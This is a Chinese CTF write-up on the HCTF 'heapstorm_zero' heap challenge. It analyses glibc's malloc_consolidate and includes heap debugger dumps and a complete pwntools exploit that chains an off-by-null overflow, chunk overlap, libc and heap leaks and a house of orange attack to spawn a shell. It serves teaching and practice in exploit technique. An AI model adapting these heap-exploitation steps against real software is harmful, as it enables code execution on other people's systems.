
---

#### 前言：
最近跟着别人的wp复现了hctf的heapstorm_zero，是一道关于malloc_consolidate的利用。

> 参考了[https://www.anquanke.com/post/id/176139#h2-1](https://www.anquanke.com/post/id/176139#h2-1 "从hctf,0ctf两道题目看malloc_consolidate ()")

自己亲自操作时，遇到了很多的坑，调试了很久才找清了原因，记录下踩到的坑。

#### malloc_consolidate
  
##### 源码分析:
该函数从chunk_size最小的fastbin头开始，依次将fastbin中的chunk放入unsorted bin中，在放入unsorted bin的过程中会检查该chunk上下的chunk是否是inuse的，如果是free的则合并，一起放入unsorted bin中，合并的操作会触发unlink。
该函数中的一些操作可以帮助绕过unlink检查，安全客的这个wp并没有说到..可能是我太菜了..不知道..
先分析下关键源码:
```
  maxfb = &fastbin (av, NFASTBINS - 1); //获得最大的chunk_size的fastbin头
    fb = &fastbin (av, 0);   //获得最小的chunk_size头
    do { 
      p = atomic_exchange_acq (fb, 0); //获得fb->fd
      if (p != 0) {
	do { //该循环用来遍历当前fastbin链中的chunk
	  check_inuse_chunk(av, p); //简单的检查。检查地址是否对齐等等..
	  nextp = p->fd; 

	  /* Slightly streamlined version of consolidation code in free() */
	  size = p->size & ~(PREV_INUSE|NON_MAIN_ARENA);
	  nextchunk = chunk_at_offset(p, size); //获取当前chunk的下一个chunk
	  nextsize = chunksize(nextchunk); //获取当前chunk的下一个chunk的size。

	  if (!prev_inuse(p)) { //如果当前chunk的前一个chunk是free的，则合并，触发unlink操作
	    prevsize = p->prev_size;
	    size += prevsize;
	    p = chunk_at_offset(p, -((long) prevsize));
	    unlink(av, p, bck, fwd);
	  }

	  if (nextchunk != av->top) { //如果当前chunk的下一个chunk不是top chunk
	    nextinuse = inuse_bit_at_offset(nextchunk, nextsize); //获取下个chunk的使用状态

	    if (!nextinuse) { //如果是free的，则合并，触发了unlink操作
	      size += nextsize;
	      unlink(av, nextchunk, bck, fwd);
	    } else
	      clear_inuse_bit_at_offset(nextchunk, 0);

	    first_unsorted = unsorted_bin->fd;  //将其链入unsorted bin中。
	    unsorted_bin->fd = p;
	    first_unsorted->bk = p;

	    if (!in_smallbin_range (size)) { //如果合并后的chunk_size属于large chunk，则将以下两项设置为NULL.
	      p->fd_nextsize = NULL;
	      p->bk_nextsize = NULL;
	    }

	    set_head(p, size | PREV_INUSE); //设置该chunk的size位
	    p->bk = unsorted_bin;  
	    p->fd = first_unsorted;
	    set_foot(p, size);  //设置p的下一个chunk的prev_size位,该操作可以帮助绕过unlink的检查，后面会说到。
	  }

	  else { //如果下一个chunk是top chunk，则直接合并到top chunk中。
	    size += nextsize;
	    set_head(p, size | PREV_INUSE);
	    av->top = p;
	  }

	} while ( (p = nextp) != 0);

      }
    } while (fb++ != maxfb);
```
##### 合并实例：

```
#include<stdio.h>
#include<stdlib.h>
int main()
{
    void *a,*b,*c,*d;
    a=malloc(0x28);
    b=malloc(0x28);
    c=malloc(0x28);
    d=malloc(0x28);
    malloc(0x10); //防止被top chunk合并。
    free(a);
    free(b);
    free(c);
    free(d);
    malloc(0x400);//触发malloc_consolidate
    return 0;
}
```
以上代码，触发malloc_consolidate时，4个大小相同的fast chunk会被合并成一个大chunk，放入unsorted bin中.流程如下:
当连续free 4个chunk后，fastbin情况如下:
```
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x602090 —▸ 0x602060 —▸ 0x602030 —▸ 0x602000 ◂— 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```
触发malloc_consolidate后，首先处理的是链表头所指向的这个chunk(0x602090),此时情况如下:
```
0x602000 FASTBIN {
  prev_size = 0, 
  size = 49, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x602030 FASTBIN {
  prev_size = 0, 
  size = 49, 
  fd = 0x602000, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x602060 FASTBIN {
  prev_size = 0, 
  size = 49, 
  fd = 0x602030, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x602090 FASTBIN {
  prev_size = 0, 
  size = 49, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x6020c0 {
  prev_size = 48, 
  size = 32, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x20f21
}
```
0x602090 这个chunk已经链入unsorted bin中，而且设置了prev_size位。由于malloc_consolidate会设置prev_inuse位，当处理 0x602060 这个chunk的时候就会和0x602090发生合并一同放入unsorted bin中:
```
0x602000 FASTBIN {
  prev_size = 0, 
  size = 49, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x602030 FASTBIN {
  prev_size = 0, 
  size = 49, 
  fd = 0x602000, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x602060 FASTBIN {
  prev_size = 0, 
  size = 97, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x6020c0 {
  prev_size = 96, 
  size = 32, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x20f21
}
```
可以看到已经合并成一个chunk_size为0x96的chunk了。以此类推，4个fastbin chunk会合并成一个大chunk放入unsorted bin中。

#### 踩到的各种坑...

解题方法原wp已经说的很清楚了，**主要就是offbyone,和scanf触发malloc_consolidate，最后通过chunk_overlap泄露地址，然后house of orange**。和原来的unsorted chunk NULL byte prison不同的地方是原来是通过直接free一个small_chunk，这样就可以后向合并了，而这里需要通过malloc_consolidate来达到合并的效果。
这里只是说下我碰到的不知道的地方。
先放上我的exp，以便后面说明.
```
#!/usr/bin/env python
# coding=utf-8
from pwn import *
a=process("./heapstorm_zero")
context.terminal=["tmux","splitw","-h"]
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x0000000000010F6)
    b *(0x555555554000+0x000000000001296)    
    ''')
#add,delete
def menu(index):
    a.recvuntil("Choice:")
    a.sendline(str(index))
def add(size,content):
    menu(1)
    a.recvuntil("size:")
    a.sendline(str(size))
    a.recvuntil("Please input chunk content:")
    a.send(content)
def delete(index):
    menu(3)
    a.recvuntil("Please input chunk index: ")
    a.sendline(str(index))
def show(index):
    menu(2)
    a.recvuntil("Please input chunk index:")
    a.sendline(str(index))
def malloc_consolidate():
    a.recvuntil("Choice:")
    a.sendline("1"*0x500)

add(0x38,'0\n')#0 0

add(0x38,'1\n')#1 0x40
add(0x38,'2\n')#2 0x80
add(0x38,'3\n')#3 0xc0
add(0x38,'4\n')#4 0x100
add(0x38,'5\n')#5 0x140

add(0x38,'6\n')#6 0x180

add(0x38,'7\n')#7 0x1c0
add(0x38,'8\n')#8 0x200
add(0x38,'9\n')#9 0x240
add(0x38,'10\n')#10 0x280

for i in range(1,6):
    delete(i)

malloc_consolidate()

add(0x28,'\x00'*0x28)#1, 0x40, offbyNULL, unsorted chunksize 0x140 ==> 0x100 
add(0x38,'\n')#2 0x70
add(0x38,'\n')#3 0xb0
add(0x38,'\n')#4 0xf0
add(0x18,'\n')#5 0x130
add(0x18,'\n')#11
delete(6)
delete(2)

malloc_consolidate()
add(0x38,'\n')#2
show(3)
a.recvuntil(": ")
libc_base=u64(a.recv(6).ljust(8,'\x00'))-88-libc.symbols["__malloc_hook"]-0x10
success("libc_base ==> 0x%x"%libc_base)
add(0x28,'\n')#6 = 3
add(0x28,p64(0x41)*3+'\n')#12  ,unsorted bin ==> 0x110
delete(12) 
delete(6) #fd ==> chunk4(chunk11)
show(3)
a.recvuntil(": ")
heap_base=u64(a.recv(6).ljust(8,'\x00'))-0xd0-0x10
success("heap_base ==> 0x%x"%heap_base)
delete(4)
io_list_all=libc_base+libc.symbols["_IO_list_all"]
payload=p64(0)*2
payload+='/bin/sh\x00'+p64(0x61)   # unsorted bin prev_size ,size 
payload+=p64(0)+p64(io_list_all-0x10)+'\n'
add(0x38,payload)
delete(7)
system_addr=libc.symbols["system"]+libc_base
payload='\x00'*0x18+p64(heap_base+0x1e8)+p64(system_addr)*3+'\n'
add(0x38,payload)
menu(1)
a.recv()
a.sendline("1")
a.interactive()
```

##### 创造last_remainder,绕过unlink检查

刚开始写exp时，使用offbyNULL是这样的:
```
for i in range(1,6):
    delete(i)
malloc_consolidate() //合并，放入unsored bin中，由于申请了large bin，遍历unsored bin的时候放入了small bin

delete(0)
add(0x38,'\x00'*0x38)
```
使用预留的chunk0，free他然后再申请到他，来造成offbyNULL，溢出其size位。
但是这样溢出后，再申请chunk就会挂掉。原因是：后面遍历small bin的时候，切割操作会触发unlink操作。
unlink会检查nextchunk的prev_size是否和将要unlink的chunk的size相同，但是溢出后size变小，nextchunk的prev_size并没有设置，所以会报错:

遍历完unsorted bin后，遍历bin，将bin中的chunk取出：
```
      else
            {
              size = chunksize (victim);
              /*  We know the first chunk in this bin is big enough to use. */
              assert ((unsigned long) (size) >= (unsigned long) (nb));
              remainder_size = size - nb;
              /* unlink */
              unlink (av, victim, bck, fwd); //这里会触发unlink操作
              /* Exhaust */
              if (remainder_size < MINSIZE)
                {
                  set_inuse_bit_at_offset (victim, size);
                  if (av != &main_arena)
                    victim->size |= NON_MAIN_ARENA;
                }
              /* Split */
              else
                {
                  remainder = chunk_at_offset (victim, nb);
           ......
```

unlink:
```
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size"); 
```

----------

原wp的解决办法是从small chunk中申请一个chunk，申请完该chunk后，剩下的chunk就变成了last_remainder，放入了unsored bin中.
再利用这个新申请的chunk来溢出剩下的chunk。从last_remainder中分割chunk的时候不会unlink，就没有nextchunk的prev_size的检查了：
```
if (in_smallbin_range (nb) &&                  // 申请的chunk属于small chunk    
              bck == unsorted_chunks (av) &&   //unsorted bin中只有last_remainder，              
              victim == av->last_remainder &&  //且其size满足要求，就会进入以下分支 
              (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
            {
              /* split and reattach remainder */
              remainder_size = size - nb;
              remainder = chunk_at_offset (victim, nb);
              unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
              av->last_remainder = remainder;
              remainder->bk = remainder->fd = unsorted_chunks (av);
              if (!in_smallbin_range (remainder_size))
                {
                  remainder->fd_nextsize = NULL;
                  remainder->bk_nextsize = NULL;
                }
              set_head (victim, nb | PREV_INUSE |
                        (av != &main_arena ? NON_MAIN_ARENA : 0));
              set_head (remainder, remainder_size | PREV_INUSE);
              set_foot (remainder, remainder_size);
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }

```

##### 利用malloc_consolidate设置prev_size绕过unlink检查.

由于属于fastbin的chunk在free的时候不会进行前后的合并操作，所以要构成NULL_byte_poison的效果就需要借助malloc_consolidate.利用他的前向合并操作.
但是合并的时候会进行unlink，需要一个小trick:
```
add(0x28,'\x00'*0x28)#1, 0x40, offbyNULL, unsorted chunksize 0x140 ==> 0x100 
add(0x38,'\n')#2 0x70
add(0x38,'\n')#3 0xb0
add(0x38,'\n')#4 0xf0
add(0x18,'\n')#5 0x130
add(0x18,'\n')#11
delete(6)
delete(2)
malloc_consolidate()
```
注意delete的顺序:
```
delete(6)
delete(2)
malloc_consolidate()
```
先delete的chunk6，再delete的chunk2，顺序不能颠倒，此时fastbin的情况如下：
```
fastbins:
0x20: 0x0
0x30: 0x0
0x40: 0x555555757070 —▸ 0x555555757180 ◂— 0x0（chunk2 -> chunk6）
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```
fastbin头指向的是chunk2，那么malloc_consolidate就会先处理chunk2，先将chunk2移入到unsored bin中，同时设置好prev_size，然后再处理chunk6，chunk6的prev_size还是0x140,就会向前合并，合并成一个大chunk，这样就造成了chunk_overlap。因为将chunk2放入unsored bin中了，且设置好了prev_size，这样unlink的时候就不会报错了。

##### 申请chunk的时候设置好size。

因为题中申请内存的时候使用的是calloc，申请到chunk后就会将chunk的内容给清0，这样chunk overlap的时候就会将重叠的chunk的chunk_head给清零了，所以申请到chunk后，注意将chunk_head给还原了。不然free的时候会报错。
```
add(0x28,p64(0x41)*3+'\n')
```
申请这个chunk的时候会把chunk4的size位给清0，所以要恢复size位，为后面的free chunk4做准备。

#### 总结
以上即是我碰到的一些问题，主要就是malloc_consolidate的时候会进行unlink操作，而unlink操作会检查将要unlink的chunk的下一个chunk的prev_size位，需要精确安排来绕过。
